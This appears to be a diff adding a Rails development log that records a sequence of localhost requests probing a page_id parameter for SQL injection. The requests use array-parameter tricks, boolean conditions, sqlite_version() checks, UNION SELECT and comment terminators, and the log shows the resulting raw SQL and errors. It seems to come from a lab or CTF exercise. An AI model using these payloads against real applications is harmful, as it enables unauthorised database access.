+  [1m[36mPage Exists? (0.4ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:5:in `show'
+  [1m[36mPage Load (0.3ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.2ms | Allocations: 10)
+  [1m[36mUser Load (0.4ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 13ms (Views: 5.6ms | ActiveRecord: 1.0ms | Allocations: 2448)
+
+
+Started GET "/pages/share?page_id=1%3d2" for ::1 at 2020-09-24 21:55:17 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"1=2"}
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:5:in `show'
+  [1m[36mPage Load (0.1ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 10)
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 5ms (Views: 1.9ms | ActiveRecord: 0.4ms | Allocations: 2450)
+
+
+Started GET "/pages/share?page_id=21%3d2" for ::1 at 2020-09-24 21:55:23 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"21=2"}
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 21], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:5:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 9ms (Views: 6.7ms | ActiveRecord: 0.3ms | Allocations: 1894)
+
+
+Started GET "/pages/share?page_id=" for ::1 at 2020-09-24 21:55:26 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>""}
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", nil], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:5:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 3ms (Views: 1.5ms | ActiveRecord: 0.3ms | Allocations: 1896)
+
+
+Started GET "/pages/share?page_id=" for ::1 at 2020-09-24 21:55:44 +0800
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>""}
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.1ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", nil], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.6ms | Allocations: 218)
+Completed 200 OK in 19ms (Views: 3.1ms | ActiveRecord: 1.9ms | Allocations: 9687)
+
+
+Started GET "/pages/share?page_id=1" for ::1 at 2020-09-24 21:55:46 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"1"}
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.1ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  [1m[36mPage Load (0.1ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:7:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 9)
+Completed 200 OK in 9ms (Views: 0.7ms | ActiveRecord: 0.4ms | Allocations: 5769)
+
+
+Started GET "/pages/share?page_id[]=1" for ::1 at 2020-09-24 21:55:52 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["1"]}
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (1) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  [1m[36mPage Load (0.1ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:7:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 9)
+Completed 200 OK in 7ms (Views: 0.8ms | ActiveRecord: 0.5ms | Allocations: 2603)
+
+
+Started GET "/pages/share?page_id[]=1" for ::1 at 2020-09-24 21:55:54 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["1"]}
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.1ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (1) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  [1m[36mPage Load (0.1ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:7:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 9)
+Completed 200 OK in 4ms (Views: 0.9ms | ActiveRecord: 0.3ms | Allocations: 2614)
+
+
+Started GET "/pages/share?page_id[]=1=2" for ::1 at 2020-09-24 21:55:59 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["1=2"]}
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (1=2) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
+Completed 200 OK in 4ms (Views: 0.7ms | ActiveRecord: 0.3ms | Allocations: 1853)
+
+
+Started GET "/pages/share?page_id[]=1s" for ::1 at 2020-09-24 21:56:07 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["1s"]}
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.8ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (1s) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+Completed 500 Internal Server Error in 4ms (ActiveRecord: 1.0ms | Allocations: 2227)
+
+
+  
+ActiveRecord::StatementInvalid (SQLite3::SQLException: unrecognized token: "1s"):
+  
+app/controllers/pages_controller.rb:6:in `show'
+Started GET "/pages/share?page_id[]=1%3d=2" for ::1 at 2020-09-24 21:56:29 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["1==2"]}
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (1==2) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 4)
+Completed 200 OK in 6ms (Views: 1.3ms | ActiveRecord: 0.4ms | Allocations: 1862)
+
+
+Started GET "/pages/share?page_id[]=1=1" for ::1 at 2020-09-24 21:56:32 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["1=1"]}
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (1=1) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  [1m[36mPage Load (0.2ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:7:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 9)
+Completed 200 OK in 6ms (Views: 1.0ms | ActiveRecord: 0.5ms | Allocations: 2608)
+
+
+Started GET "/pages/share?page_id[]=1=2" for ::1 at 2020-09-24 21:56:33 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["1=2"]}
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (1=2) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
+Completed 200 OK in 4ms (Views: 0.8ms | ActiveRecord: 0.4ms | Allocations: 1856)
+
+
+Started GET "/pages/share?page_id[]=1=2%20and%201=1" for ::1 at 2020-09-24 21:56:42 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["1=2 and 1=1"]}
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (1=2 and 1=1) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
+Completed 200 OK in 4ms (Views: 1.1ms | ActiveRecord: 0.3ms | Allocations: 1861)
+
+
+Started GET "/pages/share?page_id[]=1=1%20and%201=2" for ::1 at 2020-09-24 21:56:51 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["1=1 and 1=2"]}
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.3ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (1=1 and 1=2) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 4)
+Completed 200 OK in 4ms (Views: 1.0ms | ActiveRecord: 0.4ms | Allocations: 1858)
+
+
+Started GET "/pages/share?page_id[]=1=1%20and%201=1" for ::1 at 2020-09-24 21:56:54 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["1=1 and 1=1"]}
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (1=1 and 1=1) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  [1m[36mPage Load (0.1ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:7:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 9)
+Completed 200 OK in 5ms (Views: 0.8ms | ActiveRecord: 0.4ms | Allocations: 2608)
+
+
+Started GET "/pages/share?page_id[]=select%20sqlite_version()" for ::1 at 2020-09-24 21:58:05 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["select sqlite_version()"]}
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (select sqlite_version()) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  [1m[36mPage Load (0.1ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", nil], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:7:in `show'
+Completed 404 Not Found in 5ms (ActiveRecord: 0.5ms | Allocations: 2570)
+
+
+  
+ActiveRecord::RecordNotFound (Couldn't find Page with 'id'=select sqlite_version()):
+  
+app/controllers/pages_controller.rb:7:in `show'
+Started GET "/pages/share?page_id[]=1=2%20or%201=1" for ::1 at 2020-09-24 21:58:45 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["1=2 or 1=1"]}
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (1=2 or 1=1) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  [1m[36mPage Load (0.1ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:7:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 9)
+Completed 200 OK in 6ms (Views: 1.2ms | ActiveRecord: 0.4ms | Allocations: 2608)
+
+
+Started GET "/pages/share?page_id[]=1=2%20or%201=2" for ::1 at 2020-09-24 21:58:47 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["1=2 or 1=2"]}
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (1=2 or 1=2) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
+Completed 200 OK in 4ms (Views: 0.8ms | ActiveRecord: 0.4ms | Allocations: 1861)
+
+
+Started GET "/pages/share?page_id[]=select%20sqlite_version()%20=%20%273.27.2%27" for ::1 at 2020-09-24 22:00:25 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["select sqlite_version() = '3.27.2'"]}
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (select sqlite_version() = '3.27.2') LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  [1m[36mPage Load (0.1ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", nil], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:7:in `show'
+Completed 404 Not Found in 4ms (ActiveRecord: 0.3ms | Allocations: 2569)
+
+
+  
+ActiveRecord::RecordNotFound (Couldn't find Page with 'id'=select sqlite_version() = '3.27.2'):
+  
+app/controllers/pages_controller.rb:7:in `show'
+Started GET "/pages/share?page_id[]=select%20sqlite_version()%20=%20%223.27.2%22" for ::1 at 2020-09-24 22:00:56 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["select sqlite_version() = \"3.27.2\""]}
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (select sqlite_version() = "3.27.2") LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  [1m[36mPage Load (0.2ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", nil], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:7:in `show'
+Completed 404 Not Found in 5ms (ActiveRecord: 0.5ms | Allocations: 2568)
+
+
+  
+ActiveRecord::RecordNotFound (Couldn't find Page with 'id'=select sqlite_version() = "3.27.2"):
+  
+app/controllers/pages_controller.rb:7:in `show'
+Started GET "/pages/share?page_id[]=select%201" for ::1 at 2020-09-24 22:01:20 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["select 1"]}
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (select 1) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  [1m[36mPage Load (0.1ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", nil], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:7:in `show'
+Completed 404 Not Found in 5ms (ActiveRecord: 0.4ms | Allocations: 2567)
+
+
+  
+ActiveRecord::RecordNotFound (Couldn't find Page with 'id'=select 1):
+  
+app/controllers/pages_controller.rb:7:in `show'
+Started GET "/pages/share?page_id[]=select(1)" for ::1 at 2020-09-24 22:01:44 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["select(1)"]}
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.1ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (select(1)) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  [1m[36mPage Load (0.1ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", nil], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:7:in `show'
+Completed 404 Not Found in 3ms (ActiveRecord: 0.3ms | Allocations: 2567)
+
+
+  
+ActiveRecord::RecordNotFound (Couldn't find Page with 'id'=select(1)):
+  
+app/controllers/pages_controller.rb:7:in `show'
+Started GET "/pages/share?page_id[]=9%20and%20select%201" for ::1 at 2020-09-24 22:02:03 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["9 and select 1"]}
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.6ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (9 and select 1) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+Completed 500 Internal Server Error in 4ms (ActiveRecord: 0.7ms | Allocations: 2224)
+
+
+  
+ActiveRecord::StatementInvalid (SQLite3::SQLException: near "select": syntax error):
+  
+app/controllers/pages_controller.rb:6:in `show'
+Started GET "/pages/share?page_id[]=9%20or%20select%201" for ::1 at 2020-09-24 22:02:09 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["9 or select 1"]}
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.7ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (9 or select 1) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+Completed 500 Internal Server Error in 4ms (ActiveRecord: 0.8ms | Allocations: 2224)
+
+
+  
+ActiveRecord::StatementInvalid (SQLite3::SQLException: near "select": syntax error):
+  
+app/controllers/pages_controller.rb:6:in `show'
+Started GET "/pages/share?page_id[]=9" for ::1 at 2020-09-24 22:02:12 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["9"]}
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.3ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (9) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  [1m[36mPage Load (0.1ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 9], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:7:in `show'
+Completed 404 Not Found in 6ms (ActiveRecord: 0.6ms | Allocations: 2567)
+
+
+  
+ActiveRecord::RecordNotFound (Couldn't find Page with 'id'=9):
+  
+app/controllers/pages_controller.rb:7:in `show'
+Started GET "/pages/share?page_id[]=9%20and%20false%20union%20select%201%20--%20-" for ::1 at 2020-09-24 22:02:31 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["9 and false union select 1 -- -"]}
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.6ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (9 and false union select 1 -- -) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+Completed 500 Internal Server Error in 5ms (ActiveRecord: 0.8ms | Allocations: 2225)
+
+
+  
+ActiveRecord::StatementInvalid (SQLite3::SQLException: near "union": syntax error):
+  
+app/controllers/pages_controller.rb:6:in `show'
+Started GET "/pages/share?page_id[]=1)%20--%20-" for ::1 at 2020-09-24 22:02:41 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["1) -- -"]}
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.6ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (1) -- -) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+Completed 500 Internal Server Error in 4ms (ActiveRecord: 0.8ms | Allocations: 2237)
+
+
+  
+ActiveRecord::StatementInvalid (SQLite3::RangeException: column index out of range):
+  
+app/controllers/pages_controller.rb:6:in `show'
+Started GET "/pages/share?page_id[]=1)%20limit%201%20--%20-" for ::1 at 2020-09-24 22:03:01 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["1) limit 1 -- -"]}
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.6ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (1) limit 1 -- -) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+Completed 500 Internal Server Error in 4ms (ActiveRecord: 0.7ms | Allocations: 2237)
+
+
+  
+ActiveRecord::StatementInvalid (SQLite3::RangeException: column index out of range):
+  
+app/controllers/pages_controller.rb:6:in `show'
+Started GET "/pages/share?page_id[]=3)" for ::1 at 2020-09-24 22:03:10 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["3)"]}
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.5ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (3)) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+Completed 500 Internal Server Error in 3ms (ActiveRecord: 0.6ms | Allocations: 2224)
+
+
+  
+ActiveRecord::StatementInvalid (SQLite3::SQLException: near ")": syntax error):
+  
+app/controllers/pages_controller.rb:6:in `show'
+Started GET "/pages/share?page_id[]=3)%20" for ::1 at 2020-09-24 22:03:25 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["3) "]}
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
